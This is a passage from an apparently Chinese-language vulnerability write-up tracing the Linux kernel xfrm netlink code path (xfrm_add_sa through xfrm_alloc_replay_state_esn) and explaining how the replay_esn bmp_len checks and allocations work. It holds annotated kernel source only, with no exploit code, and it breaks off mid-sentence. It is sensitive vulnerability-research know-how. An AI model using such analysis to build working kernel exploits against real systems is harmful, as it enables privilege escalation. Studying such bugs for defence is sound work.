class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\">static int xfrm_add_sa(struct sk_buff *skb, struct nlmsghdr *nlh,</span><br><span class=\"line\">struct nlattr **attrs)</span><br><span class=\"line\">{</span><br><span class=\"line\">struct net *net = sock_net(skb-&gt;sk);</span><br><span class=\"line\">struct xfrm_usersa_info *p = nlmsg_data(nlh);</span><br><span class=\"line\">struct xfrm_state *x;</span><br><span class=\"line\">int err;</span><br><span class=\"line\">struct km_event c;</span><br><span class=\"line\"></span><br><span class=\"line\">[1]err = verify_newsa_info(p, attrs); //协议及参数检查</span><br><span class=\"line\">if (err)</span><br><span class=\"line\">return err;</span><br><span class=\"line\"></span><br><span class=\"line\">[2]x = xfrm_state_construct(net, p, attrs, &amp;err);</span><br><span class=\"line\">if (!x)</span><br><span class=\"line\">return err;</span><br><span class=\"line\"></span><br><span class=\"line\">xfrm_state_hold(x);</span><br><span class=\"line\">if (nlh-&gt;nlmsg_type == XFRM_MSG_NEWSA)</span><br><span class=\"line\">err = xfrm_state_add(x);</span><br><span class=\"line\">else</span><br><span class=\"line\">err = xfrm_state_update(x);</span><br><span class=\"line\"></span><br><span class=\"line\">xfrm_audit_state_add(x, err ? 0 : 1, true);</span><br><span class=\"line\"></span><br><span class=\"line\">if (err &lt; 0) {</span><br><span class=\"line\">x-&gt;km.state = XFRM_STATE_DEAD;</span><br><span class=\"line\">__xfrm_state_put(x);</span><br><span class=\"line\">goto out;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">c.seq = nlh-&gt;nlmsg_seq;</span><br><span class=\"line\">c.portid = nlh-&gt;nlmsg_pid;</span><br><span class=\"line\">c.event = nlh-&gt;nlmsg_type;</span><br><span class=\"line\"></span><br><span class=\"line\">km_state_notify(x, &amp;c);</span><br><span class=\"line\">out:</span><br><span class=\"line\">xfrm_state_put(x);</span><br><span class=\"line\">return err;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>在<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L151\" target=\"_blank\" rel=\"noopener\">verify_newsa_info</a>函数中，首先根据<code>id.proto</code>协议对用户输入的非兼容性参数进行检查，并对各输入参数中的长度合理性进行检查，我们只关心在[1]处的<code>XFRMA_REPLAY_ESN_VAL</code>数据检查。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">verify_newsa_info</span><span class=\"params\">(struct xfrm_usersa_info *p,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">     struct nlattr **attrs)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\"><span class=\"keyword\">int</span> err;</span><br><span class=\"line\"></span><br><span class=\"line\">err = -EINVAL;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (p-&gt;family) {</span><br><span class=\"line\"><span class=\"keyword\">case</span> AF_INET: <span class=\"comment\">//IPv4</span></span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">case</span> AF_INET6: <span class=\"comment\">//IPv6</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> IS_ENABLED(CONFIG_IPV6)</span></span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">err = -EAFNOSUPPORT;</span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">err = -EINVAL;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (p-&gt;id.proto) {</span><br><span class=\"line\"><span class=\"keyword\">case</span> IPPROTO_AH:</span><br><span class=\"line\">......</span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">case</span> IPPROTO_ESP:</span><br><span class=\"line\">......</span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">case</span> IPPROTO_COMP:</span><br><span class=\"line\">......</span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> IS_ENABLED(CONFIG_IPV6)</span></span><br><span class=\"line\"><span class=\"keyword\">case</span> IPPROTO_DSTOPTS:</span><br><span class=\"line\"><span class=\"keyword\">case</span> IPPROTO_ROUTING:</span><br><span class=\"line\">......</span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = verify_aead(attrs))) <span class=\"comment\">//XFRMA_ALG_AEAD参数长度检查</span></span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = verify_auth_trunc(attrs)))<span class=\"comment\">//XFRMA_ALG_AUTH_TRUNC参数长度检查</span></span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = verify_one_alg(attrs, XFRMA_ALG_AUTH)))<span class=\"comment\">//XFRMA_ALG_AUTH参数长度检查</span></span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = verify_one_alg(attrs, XFRMA_ALG_CRYPT)))<span class=\"comment\">//XFRMA_ALG_CRYPT参数长度检查</span></span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = verify_one_alg(attrs, XFRMA_ALG_COMP)))<span class=\"comment\">//XFRMA_ALG_COMP参数长度检查</span></span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = verify_sec_ctx_len(attrs)))<span class=\"comment\">//XFRMA_SEC_CTX数据长度定义检查</span></span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">[<span class=\"number\">1</span>]<span class=\"keyword\">if</span> ((err = verify_replay(p, attrs)))<span class=\"comment\">//XFRMA_REPLAY_ESN_VAL数据检查</span></span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">err = -EINVAL;</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (p-&gt;mode) {</span><br><span class=\"line\"><span class=\"keyword\">case</span> XFRM_MODE_TRANSPORT:</span><br><span class=\"line\"><span class=\"keyword\">case</span> XFRM_MODE_TUNNEL:</span><br><span class=\"line\"><span class=\"keyword\">case</span> XFRM_MODE_ROUTEOPTIMIZATION:</span><br><span class=\"line\"><span class=\"keyword\">case</span> XFRM_MODE_BEET:</span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">err = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">out:</span><br><span class=\"line\"><span class=\"keyword\">return</span> err;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>在<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L103\" target=\"_blank\" rel=\"noopener\">verify_replay</a>函数中，可以看到检查主要有如下几条：[1]<code>bmp_len</code>是否超过最大值，最大值定义为<code>4096/4/8</code>。[2]检查参数长度定义是否正确。[3]是否为<code>IPPROTO_ESP</code>或者<code>IPPROTO_AH</code>协议。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">int</span> <span class=\"title\">verify_replay</span><span class=\"params\">(struct xfrm_usersa_info *p,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">struct nlattr **attrs)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlattr</span> *<span class=\"title\">rt</span> = <span class=\"title\">attrs</span>[<span class=\"title\">XFRMA_REPLAY_ESN_VAL</span>];</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay_state_esn</span> *<span class=\"title\">rs</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (p-&gt;flags &amp; XFRM_STATE_ESN) {</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!rt)</span><br><span class=\"line\"><span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\">rs = nla_data(rt);</span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">1</span>]<span class=\"keyword\">if</span> (rs-&gt;bmp_len &gt; XFRMA_REPLAY_ESN_MAX / <span class=\"keyword\">sizeof</span>(rs-&gt;bmp[<span class=\"number\">0</span>]) / <span class=\"number\">8</span>)<span class=\"comment\">// (4096/4/8)</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">2</span>]<span class=\"keyword\">if</span> (nla_len(rt) &lt; xfrm_replay_state_esn_len(rs) &amp;&amp;</span><br><span class=\"line\"> nla_len(rt) != <span class=\"keyword\">sizeof</span>(*rs)) <span class=\"comment\">//bmp[0]=NULL 或 bmp+head &lt; nla_len</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!rt)</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* As only ESP and AH support ESN feature. */</span></span><br><span class=\"line\">[<span class=\"number\">3</span>]<span class=\"keyword\">if</span> ((p-&gt;id.proto != IPPROTO_ESP) &amp;&amp; (p-&gt;id.proto != IPPROTO_AH))</span><br><span class=\"line\"><span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (p-&gt;replay_window != <span class=\"number\">0</span>) </span><br><span class=\"line\"><span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>回到<code>xfrm_add_sa</code>函数，继续分析<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L528\" target=\"_blank\" rel=\"noopener\">xfrm_state_construct</a>函数。首先在<code>xfrm_state_alloc</code>中用调用<code>kzalloc</code>函数新建<code>xfrm_state</code>，并拷贝用户数据进行赋值。接下来根据用户输入的各种参数进行类型构建。关于<code>xfrm_replay_state_esn</code>这个结构体在[3]处申请，在[4]处进行验证。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> struct xfrm_state *<span class=\"title\">xfrm_state_construct</span><span class=\"params\">(struct net *net,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">       struct xfrm_usersa_info *p,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">       struct nlattr **attrs,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\"> <span class=\"keyword\">int</span> *errp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">[<span class=\"number\">1</span>]<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_state</span> *<span class=\"title\">x</span> = <span class=\"title\">xfrm_state_alloc</span>(<span class=\"title\">net</span>);</span> <span class=\"comment\">//新建 xfrm_state 结构</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> err = -ENOMEM;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!x)</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error_no_put;</span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">2</span>]copy_from_user_state(x, p); <span class=\"comment\">//拷贝用户数据</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (attrs[XFRMA_SA_EXTRA_FLAGS])</span><br><span class=\"line\">x-&gt;props.extra_flags = nla_get_u32(attrs[XFRMA_SA_EXTRA_FLAGS]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = attach_aead(x, attrs[XFRMA_ALG_AEAD])))</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = attach_auth_trunc(&amp;x-&gt;aalg, &amp;x-&gt;props.aalgo,</span><br><span class=\"line\"> attrs[XFRMA_ALG_AUTH_TRUNC])))</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!x-&gt;props.aalgo) {</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = attach_auth(&amp;x-&gt;aalg, &amp;x-&gt;props.aalgo,</span><br><span class=\"line\"> attrs[XFRMA_ALG_AUTH])))</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = attach_crypt(x, attrs[XFRMA_ALG_CRYPT])))</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((err = attach_one_algo(&amp;x-&gt;calg, &amp;x-&gt;props.calgo,</span><br><span class=\"line\"> xfrm_calg_get_byname,</span><br><span class=\"line\"> attrs[XFRMA_ALG_COMP])))</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (attrs[XFRMA_ENCAP]) {</span><br><span class=\"line\">x-&gt;encap = kmemdup(nla_data(attrs[XFRMA_ENCAP]),</span><br><span class=\"line\"> <span class=\"keyword\">sizeof</span>(*x-&gt;encap), GFP_KERNEL);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (x-&gt;encap == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (attrs[XFRMA_TFCPAD])</span><br><span class=\"line\">x-&gt;tfcpad = nla_get_u32(attrs[XFRMA_TFCPAD]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (attrs[XFRMA_COADDR]) {</span><br><span class=\"line\">x-&gt;coaddr = kmemdup(nla_data(attrs[XFRMA_COADDR]),</span><br><span class=\"line\"> <span class=\"keyword\">sizeof</span>(*x-&gt;coaddr), GFP_KERNEL);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (x-&gt;coaddr == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">xfrm_mark_get(attrs, &amp;x-&gt;mark);</span><br><span class=\"line\"></span><br><span class=\"line\">err = __xfrm_init_state(x, <span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (err)</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (attrs[XFRMA_SEC_CTX]) {</span><br><span class=\"line\">err = security_xfrm_state_alloc(x,</span><br><span class=\"line\">nla_data(attrs[XFRMA_SEC_CTX]));</span><br><span class=\"line\"><span class=\"keyword\">if</span> (err)</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">//对x-&gt;replay_esn、x-&gt;preplay_esn初始化为用户输入XFRMA_REPLAY_ESN_VAL参数</span></span><br><span class=\"line\">[<span class=\"number\">3</span>]<span class=\"keyword\">if</span> ((err = xfrm_alloc_replay_state_esn(&amp;x-&gt;replay_esn, &amp;x-&gt;preplay_esn,</span><br><span class=\"line\"> attrs[XFRMA_REPLAY_ESN_VAL])))</span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\"></span><br><span class=\"line\">x-&gt;km.seq = p-&gt;seq;</span><br><span class=\"line\">x-&gt;replay_maxdiff = net-&gt;xfrm.sysctl_aevent_rseqth;</span><br><span class=\"line\"><span class=\"comment\">/* sysctl_xfrm_aevent_etime is in 100ms units */</span></span><br><span class=\"line\">x-&gt;replay_maxage = (net-&gt;xfrm.sysctl_aevent_etime*HZ)/XFRM_AE_ETH_M;</span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">4</span>]<span class=\"keyword\">if</span> ((err = xfrm_init_replay(x)))<span class=\"comment\">//检查滑动窗口大小及flag，确定检测使用的函数</span></span><br><span class=\"line\"><span class=\"keyword\">goto</span> error;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* override default values from above */</span></span><br><span class=\"line\">xfrm_update_ae_params(x, attrs, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> x;</span><br><span class=\"line\"></span><br><span class=\"line\">error:</span><br><span class=\"line\">x-&gt;km.state = XFRM_STATE_DEAD;</span><br><span class=\"line\">xfrm_state_put(x);</span><br><span class=\"line\">error_no_put:</span><br><span class=\"line\">*errp = err;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>在<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L421\" target=\"_blank\" rel=\"noopener\">xfrm_alloc_replay_state_esn</a>中，可以看到通过<code>kzalloc</code>函数分别申请了两块同样大小的内存，大小为<code>sizeof(*replay_esn) + replay_esn-&gt;bmp_len * sizeof(__u32)</code>，并将用户数据中<code>attr[XFRMA_REPLAY_ESN_VAL]</code>内容复制过去。</p>\n <figure class=\"highlight plain\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\">static int xfrm_alloc_replay_state_esn(struct xfrm_replay_state_esn **replay_esn,</span><br><span class=\"line\">       struct xfrm_replay_state_esn **preplay_esn,</span><br><span class=\"line\">       struct nlattr *rta)</span><br><span class=\"line\">{</span><br><span class=\"line\">struct xfrm_replay_state_esn *p, *pp, *up;</span><br><span class=\"line\">int klen, ulen;</span><br><span class=\"line\"></span><br><span class=\"line\">if (!rta)</span><br><span class=\"line\">return 0;</span><br><span class=\"line\"></span><br><span class=\"line\">up = nla_data(rta);</span><br><span class=\"line\">klen = xfrm_replay_state_esn_len(up);</span><br><span class=\"line\">ulen = nla_len(rta) &gt;= klen ? klen : sizeof(*up);</span><br><span class=\"line\"></span><br><span class=\"line\">p = kzalloc(klen, GFP_KERNEL);</span><br><span class=\"line\">if (!p)</span><br><span class=\"line\">return -ENOMEM;</span><br><span class=\"line\"></span><br><span class=\"line\">pp = kzalloc(klen, GFP_KERNEL);</span><br><span class=\"line\">if (!pp) {</span><br><span class=\"line\">kfree(p);</span><br><span class=\"line\">return -ENOMEM;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">memcpy(p, up, ulen);</span><br><span class=\"line\">memcpy(pp, up, ulen);</span><br><span class=\"line\"></span><br><span class=\"line\">*replay_esn = p;</span><br><span class=\"line\">*preplay_esn = pp;</span><br><span class=\"line\"></span><br><span class=\"line\">return 0;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>最终在<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L585\" target=\"_blank\" 